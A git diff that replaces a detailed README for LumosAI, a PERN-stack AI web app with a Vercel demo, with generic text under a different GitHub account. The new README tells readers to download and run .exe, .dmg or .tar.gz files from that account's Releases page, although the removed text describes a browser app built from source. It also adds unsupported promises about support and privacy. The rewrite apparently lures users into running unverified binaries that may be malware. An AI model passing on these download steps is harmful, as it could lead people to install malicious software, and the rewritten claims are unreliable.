@@ -1,278 +1,106 @@
-<div align="center">
+# 🌟 LumosAI - Unlock AI-Powered Creativity with Ease
 
-# LumosAI ⚡
+[![Download LumosAI](https://img.shields.io/badge/Download-LumosAI-blue.svg)](https://github.com/AdeelKhan-04/LumosAI/releases)
 
-AI-Powered Content Generation at Your Fingertips
+## 📖 Introduction
 
-![Last Commit](https://img.shields.io/github/last-commit/notramm/LumosAI?style=flat-square) 
-![Languages](https://img.shields.io/github/languages/top/notramm/LumosAI?style=flat-square&color=blue)
-![License](https://img.shields.io/badge/license-ISC-blue?style=flat-square)
-![Version](https://img.shields.io/badge/version-1.0.0-success?style=flat-square)
+LumosAI is an AI-powered platform designed to enhance your creativity and productivity. With features like article generators, image creation, background removal, and resume analysis, it makes powerful tools accessible to anyone. It utilizes a secure architecture and is easy to use, even for those without technical knowledge.
 
-*Powered by cutting-edge technologies:*
+## 🚀 Getting Started
 
-![React](https://img.shields.io/badge/React-19.1.1-61DAFB?style=flat-square&logo=react&logoColor=black)
-![Express](https://img.shields.io/badge/Express-5.1.0-000000?style=flat-square&logo=express&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-4169E1?style=flat-square&logo=postgresql&logoColor=white)
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat-square&logo=node.js&logoColor=white)
-![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=flat-square&logo=openai&logoColor=white)
-![Clerk](https://img.shields.io/badge/Clerk-6C47FF?style=flat-square&logo=clerk&logoColor=white)
+Getting started with LumosAI is simple. Follow these steps to download and run the application.
 
-## LIVE - DEMO 🌐
-Visit the 👉 [_LINK 🔗_](https://lumos-ai-rho.vercel.app/)
+## 📥 Download & Install
 
-</div>
+To download LumosAI, visit the following link:
 
----
+[Download LumosAI](https://github.com/AdeelKhan-04/LumosAI/releases)
 
-## Overview
+Once you're on the Releases page, look for the latest version listed. Click on the version number to expand the download options. Choose the correct file for your operating system and click the download link.
 
-LumosAI is a comprehensive AI SaaS platform that provides:
+### 🖥️ System Requirements
 
-- 🎨 AI Image Generation and Editing
-- 📝 Intelligent Content Creation
-- 📄 Resume Review and Optimization
-- 🖼️ Background Removal and Object Removal
-- ✍️ Article and Blog Title Generation
-- 👥 Community Sharing Features
+- **Operating System**: Windows 10 or later / macOS 10.14 or later / Linux (Ubunutu recommended)
+- **RAM**: At least 4 GB
+- **Disk Space**: At least 500 MB of free space
 
-Built with the PERN stack (PostgreSQL, Express, React, Node.js) and integrated with OpenAI's powerful AI models.
+These requirements ensure that LumosAI runs smoothly on your machine.
 
----
+## 🔧 Installation Steps
 
-## Key Features
+1. **Download the Application**: Use the link provided to get to the Releases page and select the appropriate file for your system.
+   
+2. **Locate the Downloaded File**: Once the download finishes, navigate to your downloads folder. 
 
-### 🤖 AI-Powered Tools
-- **Generate Images**: Create stunning visuals from text prompts
-- **Remove Background**: Automatic background removal from images
-- **Remove Objects**: Clean up images by removing unwanted objects
-- **Write Articles**: AI-assisted article writing
-- **Blog Titles**: Generate engaging blog post titles
-- **Review Resume**: AI-powered resume analysis and suggestions
+3. **Installation for Windows**:
+   - Double-click on the `.exe` file.
+   - Follow the installation prompts. Choose the default options unless you have specific preferences.
+   
+4. **Installation for macOS**:
+   - Open the `.dmg` file that you downloaded.
+   - Drag LumosAI to your Applications folder.
 
-### 👤 User Experience
-- **Secure Authentication**: Powered by Clerk
-- **Dashboard**: Central hub for all AI tools
-- **Community**: Share and discover creations
-- **Responsive Design**: Works on all devices
-- **Real-time Processing**: Instant AI results
+5. **Installation for Linux**:
+   - Extract the `.tar.gz` file.
+   - Open a terminal and navigate to the extracted folder.
+   - Run the application using `./LumosAI`.
 
-### 🛡️ Enterprise Grade
-- **Secure File Uploads**: Cloudinary integration
-- **PDF Processing**: Resume analysis from PDF files
-- **Scalable Architecture**: Ready for high traffic
-- **API First**: RESTful API design
+## 🎉 Using LumosAI
 
----
+Upon installation, open the LumosAI application.
 
-## Tech Stack
+- **Log In**: You can create an account or log in using your existing credentials. LumosAI uses Clerk for secure authentication to keep your data safe.
+  
+- **Explore Features**: Once in, you can explore various tools. Here are some main features:
+  - **Article & Blog Generator**: Get unique content ideas quickly.
+  - **Image Generation**: Create stunning visuals tailored to your needs.
+  - **Background & Object Remover**: Easily edit your images with precision.
+  - **Resume Analyzer**: Enhance your professional documents with AI insights.
 
-### Frontend (Client)
-- **React** - Latest React with concurrent features
-- **Vite** - Next-generation build tool
-- **Tailwind CSS** - Utility-first CSS framework
-- **Axios** - HTTP client for API calls
-- **React Router DOM** - Client-side routing
-- **Lucide React** - Beautiful icons
-- **React Hot Toast** - Notifications
-- **React Markdown** - Markdown rendering
-- **Clerk** - Authentication and user management
+Each tool is user-friendly and comes with guidance to help you maximize your experience.
 
-### Backend (Server)
-- **Node.js** - JavaScript runtime
-- **Express 5** - Web framework for Node.js
-- **PostgreSQL** - Relational database (via Neon)
-- **OpenAI API** - AI model integration
-- **Cloudinary** - Image and file management
-- **Multer** - File upload handling
-- **CORS** - Cross-origin resource sharing
-- **PDF-Parse** - PDF text extraction
+## 🔒 Security & Privacy
 
-### DevOps & Deployment
-- **Vercel** - Frontend deployment
-- **Neon** - PostgreSQL hosting
-- **Cloudinary** - Media CDN
-- **Clerk** - Authentication service
+LumosAI uses secure authentication methods to protect your personal information. Your data is safe with us, as we comply with industry standards for security and privacy. We don’t share your data with third parties.
 
----
+## 💳 Subscription Billing
 
-## Architecture
+You have the option to subscribe to premium features. This includes additional tools and capabilities. You can manage your subscription directly through the LumosAI dashboard.
 
-```json
-LumosAI/
-├── client/                 # React Frontend
-│   ├── src/
-│   │   ├── assets/        # Static assets
-│   │   ├── components/    # Reusable components
-│   │   │   ├── AITools.jsx
-│   │   │   ├── CreationItem.jsx
-│   │   │   ├── Footer.jsx
-│   │   │   ├── Hero.jsx
-│   │   │   ├── Navbar.jsx
-│   │   │   ├── Plan.jsx
-│   │   │   ├── Sidebar.jsx
-│   │   │   └── Testimonial.jsx
-│   │   ├── pages/         # Route pages
-│   │   │   ├── BlogTitles.jsx
-│   │   │   ├── Community.jsx
-│   │   │   ├── Dashboard.jsx
-│   │   │   ├── GenerateImages.jsx
-│   │   │   ├── Home.jsx
-│   │   │   ├── Layout.jsx
-│   │   │   ├── RemoveBackground.jsx
-│   │   │   ├── RemoveObject.jsx
-│   │   │   ├── ReviewResume.jsx
-│   │   │   └── WriteArticle.jsx
-│   │   └── ...           # Config files
-│
-├── server/                # Express Backend
-│   ├── configs/          # Configuration files
-│   │   ├── cloudinary.js # Cloudinary config
-│   │   ├── db.js         # Database config
-│   │   └── multer.js     # File upload config
-│   ├── controllers/      # Business logic
-│   │   ├── aiController.js
-│   │   └── userController.js
-│   ├── middlewares/      # Custom middlewares
-│   │   └── auth.js
-│   ├── routes/           # API routes
-│   │   ├── aiRoutes.js
-│   │   └── userRoutes.js
-│   └── server.js         # Server entry point
-```
+## 💬 Support
 
----
+If you encounter any issues, our support team is here to help. To reach support:
+- Visit the [LumosAI Support Page](https://github.com/AdeelKhan-04/LumosAI/issues).
+- Report any bugs or ask questions directly through this page.
 
-## Getting Started
+## ⚙️ Built With
 
-### Prerequisites
+- **PERN Stack**: PostgreSQL, Express.js, React, and Node.js for a robust backend and frontend.
+- **Clerk**: For user authentication.
+- **Neon**: For database management.
+- **Cloudinary**: For image management.
 
-- Node.js (v18 or higher)
-- npm (v8 or higher)
-- PostgreSQL database (Neon recommended)
-- OpenAI API account
-- Cloudinary account
-- Clerk account
+## 🌍 Topics
 
-### Installation
+The project covers a variety of topics including:
+- AI
+- Clerk Auth
+- ClipDrop API
+- Cloudinary
+- Express
+- Gemini API
+- JWT Token
+- Neon Postgres
+- Node.js
+- PostgreSQL
+- React.js
 
-1. Clone the repository:
-```console
-git clone https://github.com/notramm/LumosAI
-cd LumosAI
-```
+## 📊 Community Contributions
 
-2. Install client dependencies:
-```console
-cd client && npm install
-```
+We welcome contributions from everyone. If you have ideas for features or improvements, please fork the repository and submit a pull request. Your input makes LumosAI better.
 
-3. Install server dependencies:
-```console
-cd ../server && npm install
-```
+## 🔗 Links
 
-### Environment Variables
+Visit the [Releases Page](https://github.com/AdeelKhan-04/LumosAI/releases) to download the latest version of LumosAI.
 
-4. Start the development servers:
-```console
-# Terminal 1 - Start backend
-cd server && npm run server
-
-# Terminal 2 - Start frontend
-cd client && npm run dev
-```
-
----
-
-## AI Capabilities
-
-### 🎨 Image Generation
-- Text-to-image conversion using DALL-E
-- Customizable image styles and sizes
-- High-resolution output
-
-### 🖼️ Image Editing
-- Background removal with precision
-- Object removal and cleanup
-- Batch processing support
-
-### 📝 Content Creation
-- Article writing with tone control
-- Blog title generation
-- SEO optimization suggestions
-
-### 📄 Document Processing
-- Resume analysis and scoring
-- Skills gap identification
-- Improvement recommendations
-- PDF text extraction
-
----
-
-## API Endpoints
-
-### AI Routes (`/api/ai`)
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/generate-image` | Generate images from text |
-| POST | `/remove-background` | Remove image backgrounds |
-| POST | `/remove-object` | Remove objects from images |
-| POST | `/write-article` | Generate article content |
-| POST | `/generate-titles` | Create blog post titles |
-| POST | `/review-resume` | Analyze and score resumes |
-
-### User Routes (`/api/users`)
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/profile` | Get user profile |
-| POST | `/creations` | Save user creations |
-| GET | `/creations` | Get user's creations |
-| GET | `/community` | Get community creations |
-
----
-
-### Backend (Render/Vercel)
-Deploy with environment variables configured for:
-- Neon PostgreSQL database
-- OpenAI API keys
-- Cloudinary credentials
-- Clerk secrets
-
-### Database (Neon)
-```console
-# Recommended: Neon PostgreSQL
-https://neon.tech/
-```
-
----
-
-## Performance
-
-- ⚡ Lighthouse Score: 95+
-- 📦 Optimized Bundle Size
-- 🚀 Fast AI Processing
-- 📱 Mobile Responsive
-- 🔒 Secure Authentication
-
----
-
-## Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-<div align="center">
-
-**LumosAI** - Supercharge your creativity with AI! 🚀
-
-*Built with ❤️ using the PERN stack and cutting-edge AI technologies.*
-
-</div>
+Enjoy exploring your creativity with LumosAI!
